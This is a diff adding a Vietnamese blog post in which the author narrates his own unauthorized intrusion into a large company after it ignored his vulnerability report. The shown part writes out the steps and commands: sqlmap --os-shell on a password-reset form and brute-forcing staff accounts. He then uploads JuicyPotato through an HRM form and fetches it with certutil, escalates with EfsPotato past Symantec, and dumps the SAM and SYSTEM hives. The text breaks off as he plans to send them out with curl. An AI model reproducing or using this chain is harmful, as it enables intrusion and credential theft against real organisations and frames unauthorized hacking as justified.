@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <meta name="google-site-verification" content="Txr_ZAJ6seUhm2Y9s8eRpRy2qOSdUO9A_9jfLLn_bPw">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" integrity="sha256-dABdfBfUoC8vJUBOwGVdm8L9qlMWaHTIfXt+7GnZCIo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"guyintheclouds.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.23.1","exturl":false,"sidebar":{"position":"right","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="Hành trình leo thang từ SQL Injection đến Domain Admin (AD) take over. Con số 15000 tỷ là tôi để giật tít thôi, nó là con số mà một tờ báo tài chính đếch nào đấy định giá tôi vô tình tìm được. Tóm lại">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Talk] Tôi đã chiếm Domain Admin (AD) một tập đoàn cỡ 15000 tỷ như thế nào?">
+<meta property="og:url" content="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/index.html">
+<meta property="og:site_name" content="Guy_in_the_clouds">
+<meta property="og:description" content="Hành trình leo thang từ SQL Injection đến Domain Admin (AD) take over. Con số 15000 tỷ là tôi để giật tít thôi, nó là con số mà một tờ báo tài chính đếch nào đấy định giá tôi vô tình tìm được. Tóm lại">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://guyintheclouds.com/banner/from-sqli-to-domain-admin.png">
+<meta property="og:image" content="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/password-reset-white.webp">
+<meta property="og:image" content="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/cmdshell_confirm2.png">
+<meta property="og:image" content="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/check-update.png">
+<meta property="og:image" content="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/check_priv.png">
+<meta property="og:image" content="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/efspotato.png">
+<meta property="og:image" content="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/efs_pe.png">
+<meta property="og:image" content="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/save_sam.png">
+<meta property="og:image" content="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/save_system.png">
+<meta property="og:image" content="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/dump_cred.png">
+<meta property="og:image" content="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/pingback_confirm.png">
+<meta property="og:image" content="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/metasploit.png">
+<meta property="og:image" content="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/cme.png">
+<meta property="og:image" content="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/admin_group.png">
+<meta property="article:published_time" content="2023-07-07T08:39:12.000Z">
+<meta property="article:modified_time" content="2025-06-14T14:58:22.546Z">
+<meta property="article:author" content="minhnq22">
+<meta property="article:tag" content="talk">
+<meta property="article:tag" content="sql injection">
+<meta property="article:tag" content="active directory">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://guyintheclouds.com/banner/from-sqli-to-domain-admin.png">
+
+
+<link rel="canonical" href="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/","path":"2023/07/07/from-sqli-to-domain-admin/","title":"[Talk] Tôi đã chiếm Domain Admin (AD) một tập đoàn cỡ 15000 tỷ như thế nào?"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>[Talk] Tôi đã chiếm Domain Admin (AD) một tập đoàn cỡ 15000 tỷ như thế nào? | Guy_in_the_clouds</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-app-compat.js" integrity="sha256-k2eD8Bl04gp35v4S01cNbO+3UeLK6mVqpOyUJz4aXzY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/firebase/11.1.0/firebase-firestore-compat.js" integrity="sha256-r1EpenNle+MZs+KB73PFJnrmIF3k29t5XGrSqfZ9PPw=" crossorigin="anonymous" defer></script>
+  <script class="next-config" data-name="firestore" type="application/json">{"enable":true,"collection":"articles","apiKey":"AIzaSyDP3hkyO3EkkJ4jY-xQFQ7J2HKYiNu6ay0","projectId":"guyintheclouds-a8920"}</script>
+  <script src="/js/third-party/statistics/firestore.js" defer></script>
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Guy_in_the_clouds</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description"># cat knowledge >> /dev/brain 2> /proc/mind</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#From-SQL-Injection"><span class="nav-number">1.</span> <span class="nav-text">From SQL Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Post-Exploitation"><span class="nav-number">2.</span> <span class="nav-text">Post Exploitation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-Transfer"><span class="nav-number">3.</span> <span class="nav-text">File Transfer</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privileges-Escalation"><span class="nav-number">4.</span> <span class="nav-text">Privileges Escalation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dump-Credential"><span class="nav-number">5.</span> <span class="nav-text">Dump Credential</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Get-Reverse-Shell"><span class="nav-number">6.</span> <span class="nav-text">Get Reverse Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pivot-Attack"><span class="nav-number">7.</span> <span class="nav-text">Pivot Attack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#To-Domain-Admin"><span class="nav-number">8.</span> <span class="nav-text">To Domain Admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Be-a-good-man-again"><span class="nav-number">9.</span> <span class="nav-text">Be a good man, again</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Learn-something"><span class="nav-number">10.</span> <span class="nav-text">Learn something</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="minhnq22"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">minhnq22</p>
+  <div class="site-description" itemprop="description"><i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="mailto:quangminhnguyen2201@gmail.com" title="E-Mail → mailto:quangminhnguyen2201@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/minhnq22" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.linkedin.com/in/minhnq22" title="Linkedin → https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;minhnq22" rel="noopener me" target="_blank"><i class="fab fa-linkedin fa-fw"></i>Linkedin</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.topcv.vn/xem-cv/BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" title="CV → https:&#x2F;&#x2F;www.topcv.vn&#x2F;xem-cv&#x2F;BAYIA1QLUwYHBVFWUFBVAgdUAgcOBwBUDAcCUw7e64" rel="noopener me" target="_blank"><i class="fa fa-bed fa-fw"></i>CV</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://guyintheclouds.com/2023/07/07/from-sqli-to-domain-admin/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="minhnq22">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Guy_in_the_clouds">
+      <meta itemprop="description" content="<i>Tác giả blog này là một người viển vông và thiếu thực tế, hay còn được gọi là người giời.</i>">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="[Talk] Tôi đã chiếm Domain Admin (AD) một tập đoàn cỡ 15000 tỷ như thế nào? | Guy_in_the_clouds">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          [Talk] Tôi đã chiếm Domain Admin (AD) một tập đoàn cỡ 15000 tỷ như thế nào?
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2023-07-07 15:39:12" itemprop="dateCreated datePublished" datetime="2023-07-07T15:39:12+07:00">2023-07-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Talk/" itemprop="url" rel="index"><span itemprop="name">Talk</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="Views">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">Views: </span>
+      <span class="firestore-visitors-count"></span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>12 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p><img src="/banner/from-sqli-to-domain-admin.png"><br><em>Hành trình leo thang từ SQL Injection đến Domain Admin (AD) take over. Con số 15000 tỷ là tôi để giật tít thôi, nó là con số mà một tờ báo tài chính đếch nào đấy định giá tôi vô tình tìm được. Tóm lại là to, nhưng cái cách mà họ phản ứng lại với việc bị tấn công mạng thì…</em></p>
+<span id="more"></span>
+<p><em>Đã hơn một năm kể từ khi tôi gửi phát hiện của mình cho phía tập đoàn và chẳng gì cả, đúng nghĩa đen, từ phản hồi cho đến khắc phục, chẳng gì cả. Cho nên thì, một vài ảnh PoC dưới đây sẽ là do tôi bịa ra để dễ mô tả, vì vấn đề vẫn còn đó.</em></p>
+<p>Mọi chuyện bắt đầu với một trang Đăng nhập. Đúng rồi đấy, SQL Injection.</p>
+<h3 id="From-SQL-Injection"><a href="#From-SQL-Injection" class="headerlink" title="From SQL Injection"></a>From SQL Injection</h3><p>Nó không xảy ra với trường Username hay Password, nó xảy ra trong chức năng ResetPassword và người dùng sẽ nhập Email hay Số điện thoại vào để hệ thống nhận diện và thực hiện các thao tác đổi mật khẩu sau đó.<br><img src="/2023/07/07/from-sqli-to-domain-admin/password-reset-white.webp"><br>Không mất nhiều thời gian để ném ngay vuln point này vào sqlmap và dump lấy vài thứ. Thậm chí tôi còn có thể thực thi lệnh trên máy chủ Cơ sở dữ liệu này chỉ với việc thêm option <code>--os-shell</code>.<br>Được rồi, dừng lại ở đây, chụp lại mấy cái ảnh làm bằng chứng và soạn một email, gửi, biết đâu lại nhận được gì đó &#x3D;)) nhưng không.<br>Không nhớ lắm, có lẽ là đôi tháng, không một động thái nào được ghi nhận. Đấy là lúc mà tôi nhận ra rằng chính những người vận hành còn chẳng buồn quan tâm đến nó. “Thôi được rồi.”, cái máu Red Team của tôi, để xem làm được gì với đống này nào.</p>
+<h3 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post Exploitation"></a>Post Exploitation</h3><p>Lấy reverse shell à, không dễ thế, vì máy chủ này không kết nối ra internet. Oẳng. Việc phát động một cuộc tấn công nội bộ vào các máy chủ lân cận chỉ với non-interactive shell như này thì hơi oái oăm.<br>Ý tưởng không mới, vẫn phải cố để tìm kiếm một đường kết nối ra bên ngoài, hoặc một cách thức nào đó để tôi có thể thao tác “thoải mái” hơn. Nếu máy chủ này không kết nối ra internet, vậy còn các máy chủ lân cận thì sao? Và làm thế nào để tôi có thể truy cập hay điều khiển những máy chủ lân cận đó?<br>Giờ tôi cần phải leo thang đặc quyền trên máy chủ này, nó chạy Windows Server 2012.<br><img src="/2023/07/07/from-sqli-to-domain-admin/cmdshell_confirm2.png"><br>Với đống thông tin <code>systeminfo</code>, nắm được OS đang được cài đặt là bản Windows Server 2012 R2 Standard, kiến trúc x64, không thuộc quản lý bởi Domain và là một máy ảo, cái đáng chú ý nhất là thông tin về những bản cập nhật đã được cài đặt.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Domain:                    WORKGROUP</span><br><span class="line">Logon Server:              N/A</span><br><span class="line">Hotfix(s):                 140 Hotfix(s) Installed.</span><br><span class="line">[01]: KB2868626</span><br><span class="line">[02]: KB2883200</span><br><span class="line">[03]: KB2887595</span><br><span class="line">[04]: KB2894852</span><br><span class="line">[05]: KB2894856</span><br><span class="line">...</span><br><span class="line">[135]: KB4486105</span><br><span class="line">[136]: KB4515846</span><br><span class="line">[137]: KB4524445</span><br><span class="line">[138]: KB4531181</span><br><span class="line">[139]: KB4578976</span><br><span class="line">[140]: KB5003671</span><br></pre></td></tr></table></figure>
+<p>Với thông tin bản cập nhật cuối cùng, KB5003671, có thể biết được lần cuối máy chủ được cập nhật vào tháng 8&#x2F;2021, tức là khoảng 1 năm trước thời điểm tôi tấn công. Vậy thì tôi sẽ thử nhắm tới những lỗ hổng leo thang đặc quyền có thể ảnh hưởng tới Windows Server 2012 R2 từ cuối 2021.<br><img src="/2023/07/07/from-sqli-to-domain-admin/check-update.png"><br>Kiểm tra <code>whoami /priv</code>, <em>SeImpersonatePrivilege Enabled</em>.<br>Nghĩ ngay đến Juicy Potato, thuộc nhà Potatoes &#x3D;)) bạn có thể đọc về những củ khoai tây ở đây.<br><img src="/2023/07/07/from-sqli-to-domain-admin/check_priv.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://jlajara.gitlab.io/Potatoes_Windows_Privesc</span><br></pre></td></tr></table></figure>
+<p>Được rồi, nhưng làm thế nào để tôi có thể tải tập tin binary vào máy chủ với cái shell không hoàn chỉnh này? Mã hoá base64 rồi ghi từng đoạn vào một tập tin text sau đó chuyển ngược lại từ base64 sang binary à. Bần cùng thì cũng phải làm cách đó, nhưng sẽ rất mất thời gian, vì còn những tập tin với kích thước cả megabyte. Máy chủ cũng không kết nối ra Internet để có thể tải. Chà. Nhưng biết đâu nó sẽ kết nối đến những máy chủ khác trong mạng nội bộ của nó, khả năng rất cao là như thế. Vậy tôi sẽ cần tải những tập tin cần thiết lên một máy chủ nào đó đang public dịch vụ ra internet và nằm trong mạng nội bộ cùng với máy chủ tôi đang có quyền điều khiển.</p>
+<h3 id="File-Transfer"><a href="#File-Transfer" class="headerlink" title="File Transfer"></a>File Transfer</h3><p>Tôi tìm lại những subdomain sau khi thực hiện recon, tập trung tìm kiếm một dịch vụ nào đó cho phép tôi tải lên tập tin ở bất kỳ định dạng nào. Phần lớn trong số chúng yêu cầu đăng nhập để thực hiện thao tác, sử dụng tài khoản của tổ chức.<br>Với khoảng mấy trăm cái email của nhân viên tôi lấy được từ lỗ hổng SQL Injection, thực hiện crack và brute-force với top 100 mật khẩu phổ biến nhất, và tóm được một vài tài khoản để mật khẩu khá dễ, chưa cần nhờ đến TI - Threat Intelligence.<br>Có được tài khoản, đăng nhập vào một trang tôi đoán là HRM. Tại đây thì có rất nhiều chỗ để có thể upload file, tôi dùng chức năng tạo yêu cầu hỗ trợ với IT-support và tải lên JuicyPotato.exe. Giờ việc tiếp theo là cần sử dụng máy chủ tôi đang có quyền điều khiển để tải về JuicyPotato.exe từ máy chủ HRM.</p>
+<p>Thực hiện nslookup với subdomain và thấy địa chỉ IP cục bộ của máy chủ HRM. Có thể việc này sẽ thành công thật.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup hrm.victimgroup.com.vn</span><br></pre></td></tr></table></figure>
+<p>Nghe ổn đấy. Giờ tải tập tin đó về.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -f https://hrm.victimgroup.com.vn/support/upload_content/JuicyPotato.exe c:\\user\public\downloads\JuicyPotato.exe</span><br><span class="line">dir c:\\users\public\downloads</span><br></pre></td></tr></table></figure>
+<p>Thành công! Có tồn tại JuicyPotato.exe trong thư mục C:\Users\Public\Downloads. Giờ thì chạy lệnh để kiểm tra xem có thể leo thang đặc quyền thành công không.</p>
+<h3 id="Privileges-Escalation"><a href="#Privileges-Escalation" class="headerlink" title="Privileges Escalation"></a>Privileges Escalation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Public\Downloads\JuicyPotato.exe -l 1337 -c &quot;&#123;4991d34b-80a1-4291-83b6-3328366b9097&#125;&quot; -p c:\windows\system32\whoami.exe</span><br></pre></td></tr></table></figure>
+<p>Nhưng, JuicyPotato.exe không tồn tại nữa. Wtf!? Lúc này tôi mới nhận ra rằng mình đã chưa kiểm tra trên máy chủ SQL này có Anti Virrus hay không, dở rồi. Nhưng thế quái nào trên máy chủ HRM lại không bị xoá?<br>Giờ cần xem mình đang đối mặt với AV nào, kiểm tra các service đang chạy trên máy chủ SQL. Symantec!</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">sq query</span><br><span class="line">...</span><br><span class="line">SERVICE_NAME: SepMasterService</span><br><span class="line">DISPLAY_NAME: Symantec Endpoint Protection</span><br><span class="line">TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">STATE              : 4  RUNNING</span><br><span class="line">(NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">CHECKPOINT         : 0x0</span><br><span class="line">WAIT_HINT          : 0x0</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: SepScanService</span><br><span class="line">DISPLAY_NAME: Symantec Endpoint Protection Scan Service</span><br><span class="line">TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">STATE              : 4  RUNNING</span><br><span class="line">(NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">CHECKPOINT         : 0x0</span><br><span class="line">WAIT_HINT          : 0x0</span><br><span class="line"></span><br><span class="line">SERVICE_NAME: sepWscSvc</span><br><span class="line">DISPLAY_NAME: Symantec Endpoint Protection WSC Service</span><br><span class="line">TYPE               : 10  WIN32_OWN_PROCESS</span><br><span class="line">STATE              : 4  RUNNING</span><br><span class="line">(NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)</span><br><span class="line">WIN32_EXIT_CODE    : 0  (0x0)</span><br><span class="line">SERVICE_EXIT_CODE  : 0  (0x0)</span><br><span class="line">CHECKPOINT         : 0x0</span><br><span class="line">WAIT_HINT          : 0x0</span><br></pre></td></tr></table></figure>
+<p>Khó mà đoán được Symantec Endpoint này có được cập nhật policy, sample thường xuyên không. Căn cứ vào thời gian uptime của máy chủ SQL này đã khoảng 1 năm trước, cùng với thời điểm hệ điều hành Windows Server 2012 được cập nhật. Tôi đoán Symantec Endpoint cũng được cài đặt và cập nhật từ thời điểm đó, và sau đó bị ngắt kết nối Internet, đại khái vậy. Cho nên tôi cần một cách thức khai thác PE mới hơn JuicyPotato.<br>Được rồi, tra từ điển tối thượng Payloads All The Things.<br><img src="/2023/07/07/from-sqli-to-domain-admin/efspotato.png"><br>Nên thử!<br>Kiểm tra trên máy chủ SQL có .NET 4.x nhưng không build được. Tôi build trên máy mình, lấy ra efs.exe, và đẩy efs.exe lên máy chủ SQL như cách đã làm với JuicyPotato.exe.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># .NET 4.x</span><br><span class="line">C:\Windows\Microsoft.Net\Framework\V4.x\csc.exe EfsPotato.cs</span><br></pre></td></tr></table></figure>
+<p>Thực thi, và &#x3D;))<br><img src="/2023/07/07/from-sqli-to-domain-admin/efs_pe.png"><br>Nice. Symantec không phát hiện ra, nó cũng không chặn cái hành vi tôi thực hiện.</p>
+<h3 id="Dump-Credential"><a href="#Dump-Credential" class="headerlink" title="Dump Credential"></a>Dump Credential</h3><p>Giờ thì tôi cần trích xuất thông tin tài khoản trên máy chủ này. Biết thừa rằng Symantec sẽ không bỏ qua cho Mimikatz hay Winpeas, cho nên không hơi đâu mà thử. Tôi dùng cách thủ công để dump: “reg save”</p>
+<p><img src="/2023/07/07/from-sqli-to-domain-admin/save_sam.png"><br><img src="/2023/07/07/from-sqli-to-domain-admin/save_system.png"></p>
+<p>Vấn đề tiếp theo, làm thế quái nào để tôi lấy được 2 cái tập tin sam và system về bây giờ, nhắc lại là nó vẫn không có kết nối ra Internet và có Symantec Endpoint bảo vệ. Khốn khổ. Cơ mà khả năng Symantec Endpoint sẽ không chặn curl.exe, đó là một binary tiêu chuẩn trên Windows phiên bản mới hơn. Ý tưởng sẽ là dùng curl.exe để gọi API upload file mà tôi đã dùng trước đó trên dịch vụ HRM. Thử xem nào.</p>
